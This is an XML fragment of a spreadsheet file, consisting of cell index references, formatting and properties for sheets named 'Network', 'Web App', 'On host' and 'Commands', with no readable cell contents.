      <c r="E1" s="4" t="s">
        <v>14</v>
      </c>
      <c r="F1" s="4" t="s">
        <v>15</v>
      </c>
      <c r="G1" s="4" t="s">
        <v>16</v>
      </c>
      <c r="H1" s="4" t="s">
        <v>5</v>
      </c>
      <c r="I1" s="4" t="s">
        <v>10</v>
      </c>
      <c r="J1" s="4" t="s">
        <v>60</v>
      </c>
      <c r="K1" s="4" t="s">
        <v>9</v>
      </c>
    </row>
    <row r="2" spans="1:11" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A2" s="2" t="s">
        <v>71</v>
      </c>
      <c r="E2" s="2" t="s">
        <v>58</v>
      </c>
      <c r="F2" s="2" t="s">
        <v>64</v>
      </c>
      <c r="G2" s="2" t="s">
        <v>58</v>
      </c>
      <c r="H2" s="2" t="s">
        <v>70</v>
      </c>
      <c r="I2" s="6" t="s">
        <v>62</v>
      </c>
      <c r="J2" s="2" t="s">
        <v>61</v>
      </c>
    </row>
  </sheetData>
  <hyperlinks>
    <hyperlink ref="I2" r:id="rId1" xr:uid="{47543907-6E09-4278-AF88-F5A1D015FB43}"/>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3E388-0D5B-4574-B9C5-0C945BA9368E}">
  <dimension ref="A1:A20"/>
  <sheetViews>
    <sheetView workbookViewId="0">
      <selection activeCell="A14" sqref="A14"/>
    </sheetView>
  </sheetViews>
  <sheetFormatPr defaultRowHeight="15" customHeight="1" x14ac:dyDescent="0.3"/>
  <cols>
    <col min="1" max="1" width="118.88671875" style="7" bestFit="1" customWidth="1"/>
    <col min="2" max="16384" width="8.88671875" style="1"/>
  </cols>
  <sheetData>
    <row r="1" spans="1:1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A1" s="3" t="s">
        <v>6</v>
      </c>
    </row>
    <row r="2" spans="1:1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A2" s="1" t="s">
        <v>74</v>
      </c>
    </row>
    <row r="3" spans="1:1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A3" s="1" t="s">
        <v>75</v>
      </c>
    </row>
    <row r="4" spans="1:1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A4" s="7" t="s">
        <v>76</v>
      </c>
    </row>
    <row r="5" spans="1:1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A5" s="7" t="s">
        <v>11</v>
      </c>
    </row>
    <row r="6" spans="1:1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A6" s="7" t="s">
        <v>77</v>
      </c>
    </row>
    <row r="7" spans="1:1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A7" s="7" t="s">
        <v>78</v>
      </c>
    </row>
    <row r="8" spans="1:1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A8" s="7" t="s">
        <v>24</v>
      </c>
    </row>
    <row r="9" spans="1:1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A9" s="7" t="s">
        <v>25</v>
      </c>
    </row>
    <row r="10" spans="1:1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A10" s="7" t="s">
        <v>26</v>
      </c>
    </row>
    <row r="11" spans="1:1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A11" s="7" t="s">
        <v>50</v>
      </c>
    </row>
    <row r="12" spans="1:1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A12" s="7" t="s">
        <v>51</v>
      </c>
    </row>
    <row r="13" spans="1:1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A13" s="7" t="s">
        <v>55</v>
      </c>
    </row>
    <row r="14" spans="1:1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A14" s="8" t="s">
        <v>57</v>
      </c>
    </row>
    <row r="15" spans="1:1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A15" s="7" t="s">
        <v>63</v>
      </c>
    </row>
    <row r="16" spans="1:1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A16" s="8" t="s">
        <v>65</v>
      </c>
    </row>
    <row r="17" spans="1:1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A17" s="7" t="s">
        <v>66</v>
      </c>
    </row>
    <row r="18" spans="1:1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A18" s="7" t="s">
        <v>67</v>
      </c>
    </row>
    <row r="19" spans="1:1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A19" s="7" t="s">
        <v>68</v>
      </c>
    </row>
    <row r="20" spans="1:1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A20" s="7" t="s">
        <v>69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Network</vt:lpstr>
      <vt:lpstr>Web App</vt:lpstr>
      <vt:lpstr>On host</vt:lpstr>
      <vt:lpstr>Commands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2026-06-23T01:31:19Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2026-06-23T11:18:14Z</dcterms:modified>
</cp:coreProperties>
</file>